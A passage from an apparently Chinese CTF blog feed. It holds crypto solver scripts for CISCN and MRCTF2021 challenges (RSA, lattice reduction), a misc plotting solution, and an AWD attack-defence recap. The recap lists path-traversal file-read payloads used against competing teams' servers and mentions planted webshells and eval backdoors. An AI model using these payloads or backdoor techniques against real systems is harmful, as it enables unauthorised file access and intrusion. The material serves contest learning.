class="number">1</span>:</span><br><span class="line">            r = add(r, tmp)</span><br><span class="line">        n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp, tmp)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">M = Matrix(ZZ,[[<span class="number">2</span>**<span class="number">512</span>,e],[<span class="number">0</span>,-n]])</span><br><span class="line">A = M.LLL()[<span class="number">0</span>]</span><br><span class="line">x = A[<span class="number">0</span>]&gt;&gt;<span class="number">512</span></span><br><span class="line"><span class="built_in">print</span>((e*x-A[<span class="number">1</span>])//n)</span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">y = -<span class="number">22131877391133483964429946329193825460775374851078084751208971056041193500203</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br><span class="line">x = -<span class="number">26279444166664821795077701675621823220865336004430428203703688888211697122228</span></span><br><span class="line">k = e*x-y*n</span><br><span class="line">K = k//y</span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line"><span class="built_in">print</span>(K)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor</span>(<span class="params">K,N</span>):</span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = K</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">518</span>):</span><br><span class="line">        s = (l+r)//<span class="number">2</span></span><br><span class="line">        v = s*s - (<span class="number">9</span>*s*s*(K-<span class="number">1</span>-s)*(K-<span class="number">1</span>-s)//(<span class="built_in">round</span>(N**<span class="number">0.25</span>)*<span class="built_in">round</span>(N**<span class="number">0.25</span>)))</span><br><span class="line">        <span class="keyword">if</span> v &lt; <span class="number">4</span>*N:</span><br><span class="line">            l = s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = s</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">factor(K,n)</span><br><span class="line"></span><br><span class="line">S = <span class="number">18383013852155207284866834850624501649134164688503883162216824258842790032992437383933186349369945088653252318167911285710266631681220716855493349532603970</span></span><br><span class="line">d = inverse(e,n+<span class="number">1</span>+S)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line">m = mul(d,c)</span><br><span class="line">flag = long_to_bytes(m[<span class="number">0</span>]) + long_to_bytes(m[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h4><p>追踪TCP流找到坐标，画图即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line"></span><br><span class="line">ff = re.<span class="built_in">compile</span>(<span class="string">r&#x27;Value.\[(.*?)\]&#x27;</span>)</span><br><span class="line">res = ff.findall(data)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">x_list = []</span><br><span class="line">y_list = []</span><br><span class="line">z_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    i = i.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    x,y,z = <span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(i[<span class="number">1</span>]),<span class="built_in">int</span>(i[<span class="number">2</span>])</span><br><span class="line">    x_list.append(x)</span><br><span class="line">    y_list.append(-y)</span><br><span class="line">    z_list.append(z)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x_list)</span><br><span class="line"><span class="built_in">print</span>(y_list)</span><br><span class="line"><span class="built_in">print</span>(z_list)</span><br><span class="line"></span><br><span class="line">plt.plot(x_list,y_list,<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CISCN&#123;&quot;</span>+md5(<span class="string">b&quot;easy_robo_xx&quot;</span>).hexdigest()+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="华东北半决赛"><a href="#华东北半决赛" class="headerlink" title="华东北半决赛"></a>华东北半决赛</h2><p>攻防科技大学主办的，半决赛就发衣服，80个队的awd体验还不错（？</p><h3 id="冥场面"><a href="#冥场面" class="headerlink" title="冥场面"></a>冥场面</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/06/ff365a6892aea9b8.png" alt="冥场面"></p><p>虽然自己被打傻了，不过自己也打了个爽，全程看流量打人&#x2F;修站（雾</p><h4 id="cafecms"><a href="#cafecms" class="headerlink" title="cafecms"></a>cafecms</h4><p>构造了这么几种payload</p><blockquote><p>&#x2F;wap&#x2F;Common&#x2F;show?templateFile&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag<br>&#x2F;wap&#x2F;Common&#x2F;show?templateFile&#x3D;&#x2F;flag<br>&#x2F;wap&#x2F;Common&#x2F;show?templateFile&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;flag</p></blockquote><p>去找了一下调用的函数位置，检查一下templateFile如果有flag直接改空就防住了</p><p>D盾还扫出来个eval后门，只不过不会用也不会修，后来被打的连妈都不认识了w</p><h4 id="eyou"><a href="#eyou" class="headerlink" title="eyou"></a>eyou</h4><p>刚开始没看这题，连上之后发现MySQL库被人删了，再后来直接被get shell了，又是一个被打的连妈都不认识的站w</p><p>在之后重启了一波，结果<code>admin.php</code>给人写了rce，flag直接被挂首页w</p><h4 id="cryptopark"><a href="#cryptopark" class="headerlink" title="cryptopark"></a>cryptopark</h4><p>awd里居然看见了密码题？拖进IDA看了两眼发现有好几个密码题，而且只要小小伪造一下就能<code>\bin\sh</code>了，然后光速写了几个密码exp接着打全场<del>（嘻嘻）</del>，后来师傅们也从堆用pwn的方法get shell了，接着拿去批量跑</p><h4 id="lol"><a href="#lol" class="headerlink" title="lol"></a>lol</h4><p>又是个任意读，不过这次我手速快，光速写exp打了一波全场 <del>（嘻嘻）</del><br>大概这么几种姿势</p><blockquote><p>&#x2F;statics&#x2F;1.php?file&#x3D;file:&#x2F;&#x2F;&#x2F;flag<br>&#x2F;statics&#x2F;1.php?file&#x3D;&#x2F;flag<br>&#x2F;statics&#x2F;1.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p></blockquote><p>修好之后发现还有人打，抓了一下流量看到这个payload</p><blockquote><p>&#x2F;index.php?g&#x3D;Admin&amp;m&#x3D;Public&amp;a&#x3D;display&amp;templateFile&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p></blockquote><p>web小白根本看不太懂PHP，更别说代码审计了wAw，于是就现场看着PHP手册和原先写好的PHP源码现场极限学习</p><p>先看<code>index.php</code>有这么段读参数的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&quot;g&quot;</span>, <span class="string">&quot;m&quot;</span>) <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="variable">$v</span>])) &#123;</span><br><span class="line">        <span class="variable">$_GET</span>[<span class="variable">$v</span>] = <span class="title function_ invoke__">ucwords</span>(<span class="variable">$_GET</span>[<span class="variable">$v</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那既然这段payload要过index.php，而所传的变量名又已知，为了短期防御，那么就可以在这个地方把所有的变量都读进来，然后处理掉就行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&quot;g&quot;</span>, <span class="string">&quot;m&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;templateFile&quot;</span>) <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="variable">$v</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$v</span> == <span class="string">&quot;templateFile&quot;</span> &amp;&amp; (</span><br><span class="line">        (<span class="variable">$_GET</span>[<span class="variable">$v</span>][<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="variable">$v</span>][<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) ||</span><br><span class="line">        (<span class="variable">$_GET</span>[<span class="variable">$v</span>][<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="variable">$v</span>][<span class="number">1</span>] == <span class="string">&#x27;f&#x27;</span>) ||</span><br><span class="line">        (<span class="variable">$_GET</span>[<span class="variable">$v</span>][<span class="number">0</span>] == <span class="string">&#x27;f&#x27;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="variable">$v</span>][<span class="number">1</span>] == <span class="string">&#x27;i&#x27;</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_GET</span>[<span class="variable">$v</span>] = <span class="title function_ invoke__">ucwords</span>(<span class="variable">$_GET</span>[<span class="variable">$v</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修好之后接着拿这几个payload去打别人了（</p><blockquote><p>&#x2F;index.php?g&#x3D;Admin&amp;m&#x3D;Public&amp;a&#x3D;display&amp;templateFile&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag<br>&#x2F;index.php?g&#x3D;Admin&amp;m&#x3D;Public&amp;a&#x3D;display&amp;templateFile&#x3D;&#x2F;flag<br>&#x2F;index.php?g&#x3D;Admin&amp;m&#x3D;Public&amp;a&#x3D;display&amp;templateFile&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;flag</p></blockquote><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>打到后面后台脚本把内存跑到16G，加上OBS和一堆乱七八糟的玩意中间炸过一次内存w，到最后的时候被打成筛子就只能检查自己的批量脚本有没有正常工作了，7个while 1的脚本同时跑着10+的payload，还有五六个打奇奇怪怪的混淆流量的脚本 （雾</p><p>各位师傅们的混淆也是tmd千奇百怪，我以为我防出去了啊，结果师傅们不讲武德，给我种🐎，打开流量我定睛一看，在一堆<code>fmyy i love you</code>、<code>xxxx yyds</code>还有奇奇怪怪的歌词里面，写的竟然全是<code>.shell.php</code>！（雾</p><p>既然我们有🐎，那别人肯定也有，然后搭了几趟顺风车，不过web小白啥也不会，别人稍微藏起来之后就尬住了w</p><p>结果rk20<br><img src="https://ftp.bmp.ovh/imgs/2021/06/066f70ace15336c0.png" alt="res"></p><p>唉，还是太菜了，第一年也只能止步于此了（</p><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><del>u1s1，平时都凭本事打进了W&amp;M，结果校赛被分到3队有、不开心</del></p><p>初赛高考没啥好说的，crypto打了2k+的分把2队按在地上锤（雾</p><p>怎么说呢，第一次打awd的萌新算是打了个爽，线下前一天晚上还在和<code>h3zh1</code>师傅学习怎么打awd，在现场用<code>ha1c9on</code>师傅教过的一点web加被迫极限学习边打边修，可能从此就转路web了（？</p><p><del>我也要在别人机子上种🐎！我也要get shell！（逃</del></p><p>感谢师傅们对我这个fw的栽培和帮助，qaq明年继续加油吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;祭第一次国赛-x2F-第一次AWD&quot;&gt;&lt;a href=&quot;#祭第一次国赛-x2F-第一次AWD&quot; class=&quot;headerlink&quot; title=&quot;祭第一次国赛&amp;#x2F;第一次AWD&quot;&gt;&lt;/a&gt;祭第一次国赛&amp;#x2F;第一次AWD&lt;/h1&gt;&lt;p&gt;华东北太卷啦太卷</summary>
      
    
    
    
    <category term="AWD" scheme="http://example.com/categories/AWD/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="AWD" scheme="http://example.com/tags/AWD/"/>
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Misc" scheme="http://example.com/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>Writeup for MRCTF2021 crypto</title>
    <link href="http://example.com/2021/04/16/Wp_for_mrctf2021/"/>
    <id>http://example.com/2021/04/16/Wp_for_mrctf2021/</id>
    <published>2021-04-16T11:58:26.000Z</published>
    <updated>2021-04-25T12:07:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Writeup-for-MRCTF2021-39-s-crypto"><a href="#Writeup-for-MRCTF2021-39-s-crypto" class="headerlink" title="Writeup for MRCTF2021&#39;s crypto"></a>Writeup for MRCTF2021&#39;s crypto</h1><p>比赛前打了疫苗，困得要命，然后神志不清的写了一堆shi，虽然比赛的时候心态炸了，但高质量的题目该复现还得复现</p><h2 id="friendly-sign-in"><a href="#friendly-sign-in" class="headerlink" title="friendly_sign-in"></a>friendly_sign-in</h2><p>签到题，定义了一个函数，要求提供使得 $f(x_{list})&#x3D;0$ 的<code>x-list</code>，回答一次给一位 $flag$ ，但之后的不能和之前的重复</p><p>直接系数两两交换，其中一个取相反数，然后为了前后不重复再乘一个系数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;node.mrctf.fun&quot;</span>, <span class="string">&quot;10007&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">passpow</span>():</span><br><span class="line">    rev = r.recvuntil(<span class="string">&quot;POW: SHA512(&quot;</span>)</span><br><span class="line">    r.recv(<span class="number">1</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">8</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(suffix)</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">        hashresult = hashlib.sha512((suffix+x).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> hashresult.startswith(<span class="string">&quot;11111&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    prefix = util.iters.mbruteforce(f,table,<span class="number">4</span>,<span class="string">&#x27;upto&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(prefix))</span><br><span class="line"></span><br><span class="line">passpow()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvuntil(<span class="string">&quot;N = &quot;</span>)</span><br><span class="line">data = r.recvline(<span class="literal">False</span>).strip().decode()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">data = data.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">N = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    N.append(<span class="built_in">int</span>(i))</span><br><span class="line"><span class="comment"># print(len(N))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(N)-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(N),<span class="number">2</span>):</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(-(j+<span class="number">1</span>)*N[i+<span class="number">1</span>]))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>((j+<span class="number">1</span>)*N[i]))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;your gift:&quot;</span>)</span><br><span class="line">    ans = r.recvline(<span class="literal">False</span>).strip().decode()</span><br><span class="line">    flag += ans</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag,<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.interactive()</span></span><br></pre></td></tr></table></figure><h2 id="nomore"><a href="#nomore" class="headerlink" title="nomore"></a>nomore</h2><p>小模数RSA，其中 $e\in (9000,10000)$ ， $p,q\in (1000000, 3000000)$ ，给了 $A&#x3D;(((y%x)^7)%(x%y))^7+y^5+(y+1)&#x2F;x$ ，一个条件 $secret&#x3D;e^3+p^3+q^3&#x3D;(x+y)%7754486886526049041+210729175671163973$ 和 $x$ 的上界</p><p>感觉是为了出题而出题，条件给的好僵硬（</p><p>因为这里是 $(y+1)&#x2F;x$ 整除，所以得到 $y+1&#x3D;k\cdot x$ （这样出题这里好没有说服力啊&#x3D; &#x3D;），所以 $y&#x3D;k\cdot x-1$ ，带入A中化简一下可得 $A&#x3D;(x-1)^7+(kx-1)^5+k$ ，显然这个玩意是递增的，而且给了 $x$ 的上界，这里可以用二分法得到 $x$ 的值，随后得到 $secret$ ，接着爆破得到 $e,p,q$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">693282726315</span></span><br><span class="line">A = <span class="number">2235930885430590738951770802593215586722001521194365487273377655750584443688709547709496531484159367793509666612116139038917661713102981488722293426038029073850795986080412124312908732573382156365974821471629333126275130148211145598662897276781331183691743094904957217401055325352877284530068805608962270139656431076370452327497416723045785664344412694060886085511378779487559306015113302658964110922621164879307182468690182325142055960562810349297544601157473985262796723316777380726315782859115449976700612343978057140270903396910431420116573138154719798955123904805279320166126412714788508008881174164656203605409187705643395043643983135944514470267283183175620492198093264226038082725867230101096344723124629565311122528005863046865164876192248803940590219355154176343702897505891392317123983475290611327887699795851456183931854177169939743970260837586185988111368384484356413787993370384262996486824251003884057486063787194241555190688935624792041028246639984544749568167915235629185515957106136630401960066317998226671344793061752525215496195839080165952892472180997564802474095868944184005854120238623750555477937802107959321257495435617363809377093354132077991399603767147974592666019334636208414969819333321639542282741932229892501074615920120228860717401055433206357806353717291748096464569063777964784860874773660469621546777686833078007220613545223169043960754010332944526795605043595879174073360317477199909570141202125189377475655277483919081658123820105695508771837612756891055031293872293977244105248233915807603916034288916844336329883443200123825714530812637709561686224468031953278836676202928878535091578725509651544544672494980806630321114490828976895602038151224026672265830787863940762596976124958000977955469148027648603199590311852993367450800166591526272653355552342455506908317529193196174849749103073968182002498580115241030154502931088245539152380579199202750010140022979979488971008874424439325749039212427088023136971891092490697689178097172878439007028844083681030357488034860471042630885195387680286557424780235116405464735985082715745087677866688657626763753940919966662710093619034074861812080778855241391731006</span></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    upper = <span class="number">4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">    lower = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(upper - lower &gt; <span class="number">1</span>):</span><br><span class="line">        x = (upper + lower) &gt;&gt; <span class="number">1</span></span><br><span class="line">        ans = (x-<span class="number">1</span>)**<span class="number">7</span> + (k*x-<span class="number">1</span>)**<span class="number">5</span> + k</span><br><span class="line">        <span class="keyword">if</span>(ans == A):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Ans Found!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(k,x)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span>(ans &gt; A):</span><br><span class="line">            upper = x</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = x</span><br><span class="line">    <span class="keyword">if</span>(flag):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">y = k*x - <span class="number">1</span></span><br><span class="line">secret = (x + y) % <span class="number">7754486886526049041</span> + <span class="number">210729175671163973</span></span><br><span class="line">my_prime = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000001</span>,<span class="built_in">min</span>(<span class="number">3000000</span>,iroot(secret,<span class="number">3</span>)[<span class="number">0</span>]),<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span>(isPrime(i)):</span><br><span class="line">        my_prime.append(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Prime ready! Found&quot;</span>,<span class="built_in">len</span>(my_prime),<span class="string">&quot;primes.&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9001</span>,<span class="number">10001</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> my_prime:</span><br><span class="line">        ans = iroot(secret - e**<span class="number">3</span> - p**<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span>(ans[<span class="number">1</span>]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Ans Found!&quot;</span>)</span><br><span class="line">            q = ans[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(e,p,q)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span>(flag):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="Common-Prime-RSA"><a href="#Common-Prime-RSA" class="headerlink" title="Common_Prime_RSA"></a>Common_Prime_RSA</h2><blockquote><p><a href="https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.33.1333&rep=rep1&type=pdf">paper</a></p></blockquote><p>如题， $p&#x3D;2ag+1,q&#x3D;2bg+1$ ，其中 $g&#x3D;N^{\beta}$ ，$\beta_1&#x3D;0.2247,\beta_2&#x3D;0.3247$ </p><p>第一部分， $g$ 显然是个比较小的数，直接coppersmith就能拿到，接着来考虑分解 $N$ ， 显然 $N&#x3D;p\cdot q&#x3D;(2ag+1)(2bg+1)&#x3D;4abg^2+2g(a+b)+1$ ，则</p><p>$$\frac{N-1}{2g}&#x3D;2gab+(a+b)$$</p><p>但由于 $\beta&#x3D;0.2247&lt;0.5$ ，导致 $g&lt;a,b$ ， 我们假设 $\frac{N-1}{2g}&#x3D;2gu+v$ ，则 $v&#x3D;a+b-2gc,u&#x3D;ab+c$ ，那么 $x^{u2g}\equiv x^{ab2g+c2g}\equiv x^{c2g}\pmod{N}$ ，即 ${x^{2g}}^u&#x3D;{x^{2g}}^c$ ，所以我们可以使用 $bsgs$ 算法来得到 $c$ ，因为题目中 $p$ 与 $q$ 较为接近，所以上述的 $a$ 与 $b$ 也比较接近，我们知道 $a\cdot b≈u≈\frac{N}{(2\cdot g1)^2}$ ， 根据对勾函数的性质， $x≈y\in (\sqrt{u},\sqrt{2u})$ ，随后即可得到 $c$ 较为精确的答案区间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 